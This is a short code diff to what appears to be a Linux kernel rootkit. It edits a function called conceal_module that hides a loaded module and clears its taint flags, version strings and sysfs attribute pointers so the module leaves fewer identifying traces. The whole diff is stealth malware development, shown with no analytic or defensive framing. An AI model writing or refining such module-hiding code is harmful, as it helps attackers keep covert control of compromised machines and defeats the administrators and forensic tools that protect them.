@@ -71,11 +71,12 @@ static void conceal_module(void) {
 	/* E.HIDE.1 meta cleanup — nothing legitimate reaches these fields once
 	 * we're off mod_list, but a backdoor pointer to `struct module*` still
 	 * would dereference them. Zero the ones that leak identifying info. */
-#ifdef CONFIG_MODULE_UNLOAD
 	mod->taints = 0;
-#endif
 #ifdef CONFIG_MODVERSIONS
-	memset(mod->srcversion, 0, sizeof(mod->srcversion));
+	/* `version` and `srcversion` are `const char *` in struct module, not
+	 * arrays — drop the string pointers instead of memset'ing them. */
+	mod->version = NULL;
+	mod->srcversion = NULL;
 #endif
 	mod->notes_attrs = NULL;
 	mod->modinfo_attrs = NULL;
